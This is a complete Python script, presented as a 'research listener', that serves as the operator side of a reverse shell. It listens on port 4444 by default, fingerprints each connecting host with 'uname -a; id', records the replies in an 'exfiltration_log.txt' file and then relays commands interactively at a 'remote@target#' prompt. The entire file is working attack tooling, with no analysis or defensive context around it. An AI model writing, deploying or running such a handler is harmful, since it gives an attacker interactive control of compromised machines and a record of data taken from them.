import socket
import sys
import datetime

def start_research_listener(port):
    print(f"[*] Awaiting Remote Connection on Port {port}...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(1)

    try:
        conn, addr = server.accept()
        print(f"[!] CONNECTION RECEIVED from {addr[0]}:{addr[1]}")
        
        # Log basic system fingerprinting info
        conn.send(b"uname -a; id; echo $HOSTTYPE\n")
        data = conn.recv(1024).decode()
        
        log_entry = f"--- Session: {datetime.datetime.now()} ---\n{data}\n"
        with open("exfiltration_log.txt", "a") as f:
            f.write(log_entry)
        
        print(f"[+] Remote Target Identified:\n{data}")
        print("[*] Switching to Interactive Shell. Type 'exit' to close.")

        # Interactive relay
        while True:
            cmd = input("remote@target# ")
            if cmd.lower() == 'exit': break
            conn.send((cmd + "\n").encode())
            print(conn.recv(4096).decode())

    except KeyboardInterrupt:
        print("\n[*] Listener shutting down.")
    finally:
        server.close()

if __name__ == "__main__":
    start_research_listener(int(sys.argv[1]) if len(sys.argv) > 1 else 4444)
